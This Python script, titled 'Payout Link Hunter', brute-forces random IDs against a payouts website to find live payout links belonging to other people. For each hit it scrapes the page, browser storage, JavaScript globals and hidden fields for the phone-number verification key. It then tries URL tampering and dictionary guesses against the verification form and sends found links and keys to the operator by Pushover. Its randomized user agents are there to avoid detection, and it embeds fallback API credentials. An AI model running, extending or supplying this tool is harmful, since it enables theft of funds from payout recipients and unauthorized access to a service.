#!/usr/bin/env python3
"""
Payout Link Hunter - Complete Production Script
Zero cost, maximum speed using redirect detection
"""

import asyncio
import aiohttp
import random
import string
import json
import time
from datetime import datetime
import requests
import sys
import os
import re # New import for regex
from selenium import webdriver # New import for web automation
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager
from fake_useragent import UserAgent # NEW: Import for OpSec

# ==================== CONFIGURATION ====================
PUSHOVER_USER_KEY = os.getenv("PUSHOVER_USER", "uthdrjggurywppdc33k5y49nkeegqe")
PUSHOVER_APP_TOKEN = os.getenv("PUSHOVER_TOKEN", "akwpdxg8sgshj353wz3xdgfmfjbhez")
BASE_URL = "https://mesa.payoutsnetwork.com/?id="
ERROR_URL = "https://mesa.payoutsnetwork.com/error"
CONCURRENT_CONNECTIONS = 200
BATCH_SIZE = 500
REQUEST_TIMEOUT = 3
MAX_RETRIES = 1
FOUND_LINKS_FILE = "found_payouts.json"
STATS_FILE = "hunt_stats.json"
FREE_PROXIES = []
PHONE_NUMBER_PATTERN = r'\(\d{3}\)\s*\d{3}-\d{4}|\d{10}'

# ========================================================

class PayoutHunter:
    def __init__(self):
        self.found_links = self.load_found_links()
        self.stats = self.load_stats()
        self.session = None
        self.proxy_index = 0
        self.start_time = time.time()
        self.checks_count = 0
        self.use_proxies = bool(FREE_PROXIES)
        self.driver = None
        
        # NEW: Initialize UserAgent for OpSec
        self.ua = UserAgent(fallback='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36')

        if not PUSHOVER_USER_KEY or not PUSHOVER_APP_TOKEN:
            print("⚠️  WARNING: Pushover credentials not set!")
            print("   Continuing without notifications.")

    def load_found_links(self):
        try:
            with open(FOUND_LINKS_FILE, "r") as f:
                data = json.load(f)
                return set(link["url"] for link in data.get("links", []))
        except FileNotFoundError:
            return set()

    def load_stats(self):
        try:
            with open(STATS_FILE, "r") as f:
                return json.load(f)
        except FileNotFoundError:
            return {
                'total_checked': 0,
                'total_found': 0,
                'last_found': None,
                'hunt_sessions': 0,
                'checks_per_sec': 0 # Added for dashboard
            }

    def save_found_link(self, url, key_status):
        data = {'links': []}
        try:
            with open(FOUND_LINKS_FILE, 'r') as f:
                data = json.load(f)
        except:
            pass
        data['links'].append({
            'url': url,
            'id': url.split('=')[-1],
            'found_at': datetime.now().isoformat(),
            'session': self.stats['hunt_sessions'],
            'key_status': key_status # Added for dashboard
        })
        with open(FOUND_LINKS_FILE, 'w') as f:
            json.dump(data, f, indent=2)

    def save_stats(self, checks_per_sec=0):
        self.stats['total_checked'] = self.checks_count
        self.stats['total_found'] = len(self.found_links)
        self.stats['checks_per_sec'] = checks_per_sec # Updated for dashboard
        with open(STATS_FILE, 'w') as f:
            json.dump(self.stats, f, indent=2)

    def get_random_headers(self):
        """Generates random headers for OpSec"""
        return {
            'User-Agent': self.ua.random,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
        }

    async def check_id(self, id_str, session=None):
        url = BASE_URL + id_str
        if url in self.found_links:
            return None
        if not session:
            session = self.session
        for retry in range(MAX_RETRIES + 1):
            try:
                headers = self.get_random_headers()
                async with session.get(url, allow_redirects=False, ssl=False, headers=headers) as response:
                    if response.status in [301, 302, 303, 307, 308]:
                        location = response.headers.get("Location", "")
                        if ERROR_URL in location or '/error' in location:
                            return None
                    return url
            except asyncio.TimeoutError:
                if retry < MAX_RETRIES:
                    await asyncio.sleep(0.1)
                    continue
                return None
            except Exception:
                return None
        return None

    def initialize_driver(self):
        if self.driver:
            return
        options = webdriver.ChromeOptions()
        options.add_argument('--headless')
        options.add_argument('--no-sandbox')
        options.add_argument('--disable-dev-shm-usage')
        options.add_argument(f'user-agent={self.ua.random}')
        
        try:
            service = Service(ChromeDriverManager().install())
            self.driver = webdriver.Chrome(service=service, options=options)
            self.driver.set_page_load_timeout(10)
        except Exception as e:
            print(f"⚠️  WebDriver initialization failed: {e}")
            self.driver = None

    def analyze_and_extract_key(self, url):
        self.initialize_driver()
        if not self.driver:
            return None
        try:
            self.driver.get(url)
            time.sleep(2)
            
            # 1. Search the entire page source for the phone number pattern
            page_source = self.driver.page_source
            match = re.search(PHONE_NUMBER_PATTERN, page_source)
            if match:
                return match.group(0).strip()

            # 2. Search for the key in JavaScript variables and client-side storage
            
            # Function to search storage (Local and Session)
            def search_storage(storage_type):
                try:
                    storage_data = self.driver.execute_script(f"""
                        let data = {{}};
                        for (let i = 0; i < {storage_type}.length; i++) {{
                            let key = {storage_type}.key(i);
                            data[key] = {storage_type}.getItem(key);
                        }}
                        return data;
                    """)
                    for key, value in storage_data.items():
                        if value and re.search(PHONE_NUMBER_PATTERN, value):
                            return value.strip()
                except:
                    pass
                return None

            # Search Local Storage
            storage_key = search_storage('localStorage')
            if storage_key:
                return storage_key

            # Search Session Storage
            storage_key = search_storage('sessionStorage')
            if storage_key:
                return storage_key

            # 3. Search Global JavaScript Variables
            js_script = """
            function findPhoneNumber(obj) {
                const pattern = /\(\d{3}\)\s*\d{3}-\d{4}|\d{10}/;
                for (const key in obj) {
                    if (typeof obj[key] === 'string' && pattern.test(obj[key])) {
                        return obj[key];
                    }
                }
                return null;
            }
            return findPhoneNumber(window);
            """
            js_key = self.driver.execute_script(js_script)
            if js_key:
                return js_key.strip()

            # 4. Search hidden inputs
            hidden_inputs = self.driver.find_elements(by=webdriver.common.by.By.XPATH, value="//input[@type='hidden']")
            for element in hidden_inputs:
                value = element.get_attribute('value')
                if value and re.search(PHONE_NUMBER_PATTERN, value):
                    return value.strip()
            
            return None
        except Exception as e:
            print(f"   ⚠️  Key extraction failed for {url}: {e}")
            return None

    def attempt_invasive_bypass(self, url):
        """
        Attempts active, invasive pen-testing methods to bypass verification.
        """
        self.initialize_driver()
        if not self.driver:
            return None

        # 1. Direct Access Tampering
        try:
            tampered_url = url + "&verified=true"
            self.driver.get(tampered_url)
            if "payout/final" in self.driver.current_url or "success" in self.driver.page_source.lower():
                return f"DIRECT ACCESS SUCCESS: {tampered_url}"
        except:
            pass

        # 2. Brute Force/Dictionary Attack
        COMMON_KEYS = [
            '5551234567',
            '1234567890',
            '1111111111',
            '0000000000',
            url.split("=")[-1]
        ]

        try:
            self.driver.get(url)
            # Find the input field (assuming a common name like 'phone' or 'code')
            # ***USER MUST CUSTOMIZE THIS XPATH***
            input_field = self.driver.find_element(by=webdriver.common.by.By.XPATH, value="//input[@type='tel' or @name='phone' or @name='code']")
            submit_button = self.driver.find_element(by=webdriver.common.by.By.XPATH, value="//button[@type='submit' or contains(text(), 'Verify')]")
            
            for key_attempt in COMMON_KEYS:
                input_field.clear()
                input_field.send_keys(key_attempt)
                submit_button.click()
                time.sleep(1)
                
                if "payout/final" in self.driver.current_url or "success" in self.driver.page_source.lower():
                    return f"BRUTE FORCE SUCCESS: Key '{key_attempt}'"
                
                self.driver.back()

        except Exception as e:
            pass
            
        return None

    def send_notification(self, url, key=None):
        if not PUSHOVER_USER_KEY or not PUSHOVER_APP_TOKEN:
            return
        message_body = f"Found active payout link:\n{url}"
        if key:
            message_body = f"Key Found! Enter this to verify:\n{key}\n\nLink:\n{url}"
            title = '🔑 Payout Link & Key Found!'
        else:
            title = '💰 New Payout Found!'
        def notify():
            try:
                headers = self.get_random_headers()
                requests.post(
                    "https://api.pushover.net/1/messages.json",
                    data={
                        "token": PUSHOVER_APP_TOKEN,
                        "user": PUSHOVER_USER_KEY,
                        "title": title,
                        "message": message_body,
                        "url": url,
                        "url_title": "Open Payout",
                        "priority": 1,
                        "sound": "cashregister"
                    },
                    headers=headers,
                    timeout=5
                )
                print(f"   📱 Notification sent!")
            except Exception as e:
                print(f"   ⚠️  Notification failed: {e}")
        asyncio.create_task(asyncio.to_thread(notify))

    async def hunt_batch(self):
        ids = []
        for _ in range(BATCH_SIZE):
            id_str = "".join(random.choices(string.ascii_letters + string.digits, k=10))
            ids.append(id_str)
        tasks = [self.check_id(id_str) for id_str in ids]
        results = await asyncio.gather(*tasks)
        found_count = 0
        for url in results:
            if url:
                if url not in self.found_links:
                    self.found_links.add(url)
                    
                    key = self.analyze_and_extract_key(url)
                    
                    if not key:
                        invasive_result = self.attempt_invasive_bypass(url)
                        if invasive_result:
                            key = invasive_result
                            key_status = f"Key: {key} (INVASIVE BYPASS SUCCESS)"
                        else:
                            key_status = "Key: NOT FOUND (Manual Check Required)"
                    else:
                        key_status = f"Key: {key} (PASSIVE EXTRACTION SUCCESS)"
                    
                    self.save_found_link(url, key_status) # Save link with status
                    self.send_notification(url, key)
                    self.stats['last_found'] = datetime.now().isoformat()
                    found_count += 1
                    print(f"\n🎉 FOUND: {url} | {key_status}")
        self.checks_count += len(ids)
        return found_count

    async def main(self):
        print("🔫  Starting Payout Hunter...")
        print(f"   - Concurrent checks: {CONCURRENT_CONNECTIONS}")
        print(f"   - Batch size: {BATCH_SIZE}")
        print(f"   - OpSec Mode: ACTIVE (Randomized User-Agents)")
        print(f"   - Pen-Test Mode: ACTIVE (Invasive Key Extraction)")
        print("   - Starting Dashboard on http://localhost:5000")
        print("   - Press Ctrl+C to stop")
        print("\n" + "="*40)
        self.stats['hunt_sessions'] += 1
        timeout = aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
        connector = aiohttp.TCPConnector(limit_per_host=CONCURRENT_CONNECTIONS, ssl=False)
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            self.session = session
            while True:
                try:
                    batch_start_time = time.time()
                    found_in_batch = await self.hunt_batch()
                    batch_duration = time.time() - batch_start_time
                    
                    # Calculate rate for dashboard
                    checks_per_sec = BATCH_SIZE / batch_duration if batch_duration > 0 else 0
                    
                    print(
                        f"[{datetime.now().strftime('%H:%M:%S')}] "
                        f"Checked: {self.checks_count:,.0f} | "
                        f"Found: {len(self.found_links)} | "
                        f"Rate: {checks_per_sec:,.0f}/s | "
                        f"Batch time: {batch_duration:.2f}s | "
                        f"Found this batch: {found_in_batch}"
                    )
                    
                    self.save_stats(checks_per_sec) # Save stats including rate
                except aiohttp.ClientConnectorError as e:
                    print(f"\n⚠️  Connection error: {e}. Check your internet or proxy.")
                    await asyncio.sleep(10)
                except Exception as e:
                    print(f"\nAn unexpected error occurred: {e}")
                    await asyncio.sleep(10)

if __name__ == "__main__":
    hunter = PayoutHunter()
    try:
        asyncio.run(hunter.main())
    except KeyboardInterrupt:
        print("\n\n🛑 Hunt stopped by user.")
        hunter.save_stats()
        if hunter.driver:
            hunter.driver.quit()
        print("   Final stats saved.")
    finally:
        print("👋 Goodbye!")
